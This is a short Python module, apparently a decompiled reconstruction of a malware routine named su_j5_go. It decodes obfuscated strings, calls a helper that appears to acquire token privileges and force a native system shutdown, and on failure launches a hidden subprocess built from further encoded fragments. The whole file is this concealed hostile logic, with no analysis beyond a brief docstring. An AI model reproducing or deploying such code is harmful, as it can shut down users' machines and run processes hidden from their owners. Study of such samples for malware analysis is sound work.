"""Recovered zero-argument entry ``su_j5_go``.

Decompiled structure: token-privilege setup followed by a hidden
``subprocess.Popen`` whose argv is two decoded fragments plus a dynamic
line segment.
"""
from __future__ import annotations

from ..link._fds_jm import sec
from . import _ops


def su_j5_go() -> None:
    _priv = sec("fg_vn_9c")
    _dll_a = sec("gh_wo_4r")
    _dll_k = sec("hi_xp_7m")
    _dll_u = sec("ij_yq_0b")
    _api = sec("jk_zr_3t")
    _primed = _ops.shutdown_native(_dll_a, _dll_k, _priv, _dll_u, _api)
    if not _primed:
        _sp = sec("lm_bt_1d")
        _line = sec("mn_cu_8f")
        _args = sec("zp_uq_6n") + sec("hm_xd_3k")
        _ops.hidden_popen((_sp, _line, _args))

